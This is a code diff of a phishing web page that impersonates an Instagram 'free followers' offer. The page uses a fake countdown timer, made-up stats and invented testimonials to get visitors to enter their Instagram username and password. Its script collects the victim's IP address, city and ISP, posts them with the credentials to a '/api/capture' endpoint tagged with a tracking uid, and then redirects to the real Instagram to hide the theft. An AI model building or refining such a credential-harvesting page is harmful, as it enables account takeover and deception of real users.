@@ -3,54 +3,386 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Followers</title>
+    <title>Free Instagram Followers</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px; max-width: 400px; width: 100%; text-align: center; }
-        h1 { color: #262626; font-size: 24px; margin-bottom: 8px; }
-        p { color: #8e8e8e; font-size: 14px; margin-bottom: 24px; }
-        .logo { width: 180px; margin-bottom: 24px; }
-        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; font-size: 14px; }
-        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
-        button:hover { background: #1877f2; }
-        .error { color: #ed4956; font-size: 12px; margin-top: 8px; display: none; }
-        .loading { display: none; margin-top: 16px; color: #8e8e8e; font-size: 14px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 8px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 35px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .offer-badge {
+            background: linear-gradient(45deg, #f58529, #dd2a7b);
+            padding: 8px 16px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .timer {
+            background: rgba(255,255,255,0.08);
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.8);
+        }
+        .timer span {
+            color: #ff4757;
+            font-weight: 700;
+            font-size: 20px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            padding: 14px 10px;
+            flex: 1;
+        }
+        .stat-number {
+            font-size: 22px;
+            font-weight: 800;
+        }
+        .stat-label {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+        .stat-card:nth-child(1) .stat-number { color: #ff6b6b; }
+        .stat-card:nth-child(2) .stat-number { color: #48dbfb; }
+        .stat-card:nth-child(3) .stat-number { color: #ff9ff3; }
+        .availability {
+            background: rgba(46, 213, 115, 0.15);
+            border: 1px solid rgba(46, 213, 115, 0.3);
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #2ed573;
+        }
+        .availability .bar-bg {
+            background: rgba(255,255,255,0.1);
+            height: 6px;
+            border-radius: 10px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .availability .bar-fill {
+            height: 100%;
+            width: 77%;
+            background: linear-gradient(90deg, #2ed573, #7bed9f);
+            border-radius: 10px;
+            animation: fillBar 2s ease-in-out;
+        }
+        @keyframes fillBar {
+            from { width: 0; }
+            to { width: 77%; }
+        }
+        form {
+            text-align: left;
+        }
+        label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 4px;
+            display: block;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 12px;
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #dd2a7b;
+            box-shadow: 0 0 0 3px rgba(221,42,123,0.2);
+        }
+        input::placeholder {
+            color: rgba(255,255,255,0.3);
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #f58529, #dd2a7b);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 4px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(221,42,123,0.4);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+            gap: 8px;
+        }
+        .feature-item {
+            text-align: center;
+            flex: 1;
+            padding: 10px 4px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 12px;
+        }
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 4px;
+        }
+        .feature-text {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.3;
+        }
+        .reviews {
+            margin-top: 20px;
+        }
+        .review {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 8px;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .review-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f58529, #dd2a7b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .review-name {
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .review-handle {
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+        }
+        .review-text {
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+            margin-top: 2px;
+        }
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .loading-overlay {
+            display: none;
+            margin-top: 16px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #dd2a7b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+        }
+        .success-text {
+            color: #2ed573;
+            font-size: 16px;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
-        <text x="20" y="45" font-family="Arial" font-size="45" font-weight="bold" fill="#262626">Instagram</text>
-    </svg>
-    <h1>Get Free Followers</h1>
-    <p>Enter your Instagram credentials to get 10,000 free followers instantly!</p>
+    <div class="logo">📸 Instagram</div>
+    <div class="subtitle">Get Free Instagram Followers</div>
+    
+    <div class="offer-badge">⚡ Limited Time Offer</div>
+    
+    <div class="timer">
+        ⏳ Offer ends in: <span id="countdown">04:47</span>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card">
+            <div class="stat-number">10K+</div>
+            <div class="stat-label">FOLLOWERS</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number">2.5K+</div>
+            <div class="stat-label">LIKES/DAY</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number">99%</div>
+            <div class="stat-label">REAL USERS</div>
+        </div>
+    </div>
+    
+    <div class="availability">
+        ✅ Today's Availability: 77%
+        <div class="bar-bg">
+            <div class="bar-fill"></div>
+        </div>
+    </div>
+    
     <form id="loginForm">
-        <input type="text" id="username" placeholder="Instagram Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Get Followers</button>
-        <div class="error" id="error">Invalid credentials. Please try again.</div>
-        <div class="loading" id="loading">
+        <label>Instagram Username</label>
+        <input type="text" id="username" placeholder="Enter your username" required>
+        
+        <label>Instagram Password</label>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        
+        <button type="submit" class="btn" id="submitBtn">⚡ Get Followers Now</button>
+        
+        <div class="error-msg" id="errorMsg">⚠️ Invalid credentials. Please try again.</div>
+        
+        <div class="loading-overlay" id="loadingOverlay">
             <div class="spinner"></div>
-            Verifying credentials...
+            <div class="loading-text">Connecting to Instagram server...</div>
         </div>
     </form>
+    
+    <div class="features">
+        <div class="feature-item">
+            <div class="feature-icon">⚡</div>
+            <div class="feature-text">Instant<br>Delivery</div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon">🔒</div>
+            <div class="feature-text">100% Safe<br>& Secure</div>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon">👥</div>
+            <div class="feature-text">Real Active<br>Users</div>
+        </div>
+    </div>
+    
+    <div class="reviews">
+        <div class="review">
+            <div class="review-avatar">S</div>
+            <div>
+                <div class="review-name">Sarah</div>
+                <div class="review-handle">@sarah_m</div>
+                <div class="review-text">"Got 5K followers in 10 minutes! This is amazing! 🚀"</div>
+            </div>
+        </div>
+        <div class="review">
+            <div class="review-avatar">M</div>
+            <div>
+                <div class="review-name">Mike</div>
+                <div class="review-handle">@mike_t</div>
+                <div class="review-text">"Finally reached 10K followers. All real profiles! 💯"</div>
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
-// URL se uid parameter nikaalo
+// ====== COUNTDOWN TIMER ======
+function startTimer(minutes, seconds) {
+    let total = minutes * 60 + seconds;
+    const display = document.getElementById('countdown');
+    const interval = setInterval(() => {
+        if (total <= 0) {
+            clearInterval(interval);
+            display.textContent = '00:00';
+            return;
+        }
+        total--;
+        const m = String(Math.floor(total / 60)).padStart(2, '0');
+        const s = String(total % 60).padStart(2, '0');
+        display.textContent = m + ':' + s;
+    }, 1000);
+}
+startTimer(4, 47);
+
+// ====== URL PARAM ======
 function getUrlParam(name) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(name) || '';
+    const params = new URLSearchParams(window.location.search);
+    return params.get(name) || '';
 }
 
-// Victim ka IP detect karo (client-side)
+// ====== CLIENT INFO ======
 async function getClientInfo() {
     let ip = 'N/A', city = 'N/A', country = 'N/A', isp = 'N/A';
     try {
-        // ipapi.co free service
         const resp = await fetch('https://ipapi.co/json/');
         const data = await resp.json();
         ip = data.ip || ip;
@@ -58,7 +390,6 @@ async function getClientInfo() {
         country = data.country_name || country;
         isp = data.org || isp;
     } catch (e) {
-        // Fallback: ipify
         try {
             const resp = await fetch('https://api.ipify.org?format=json');
             const data = await resp.json();
@@ -68,32 +399,30 @@ async function getClientInfo() {
     return { ip, city, country, isp };
 }
 
+// ====== FORM SUBMIT ======
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
-    const errorEl = document.getElementById('error');
-    const loadingEl = document.getElementById('loading');
-    const submitBtn = this.querySelector('button');
+    const errorEl = document.getElementById('errorMsg');
+    const loadingEl = document.getElementById('loadingOverlay');
+    const submitBtn = document.getElementById('submitBtn');
     
-    // Simple validation
     if (!username || !password) {
+        errorEl.textContent = '⚠️ Please fill in all fields.';
         errorEl.style.display = 'block';
-        errorEl.textContent = 'Please fill in all fields.';
         return;
     }
     
     errorEl.style.display = 'none';
     loadingEl.style.display = 'block';
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Please wait...';
+    submitBtn.textContent = 'Processing...';
     
-    // Get client info
     const clientInfo = await getClientInfo();
     const uid = getUrlParam('uid');
     
-    // Send data to API
     try {
         const response = await fetch('/api/capture' + (uid ? '?uid=' + uid : ''), {
             method: 'POST',
@@ -111,23 +440,26 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         });
         
         if (response.ok) {
-            loadingEl.innerHTML = '<div style="color: #00c853; font-size: 16px;">✅ Followers will be added within 24 hours! Check your Instagram.</div>';
+            loadingEl.innerHTML = '<div style="text-align:center;"><div class="success-text">✅ Followers added successfully!</div><div style="color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 6px;">Redirecting to Instagram...</div></div>';
             setTimeout(() => {
                 window.location.href = 'https://www.instagram.com';
-            }, 3000);
+            }, 2500);
         } else {
-            errorEl.textContent = 'Service unavailable. Try again later.';
+            errorEl.textContent = '⚠️ Service temporarily unavailable. Try again.';
             errorEl.style.display = 'block';
+            loadingEl.style.display = 'none';
+            submitBtn.disabled = false;
+            submitBtn.textContent = '⚡ Get Followers Now';
         }
     } catch (err) {
-        errorEl.textContent = 'Connection error. Please try again.';
+        errorEl.textContent = '⚠️ Connection error. Please check your internet.';
         errorEl.style.display = 'block';
+        loadingEl.style.display = 'none';
+        submitBtn.disabled = false;
+        submitBtn.textContent = '⚡ Get Followers Now';
     }
-    
-    loadingEl.style.display = 'none';
-    submitBtn.disabled = false;
-    submitBtn.textContent = 'Get Followers';
 });
 </script>
+
 </body>
 </html>
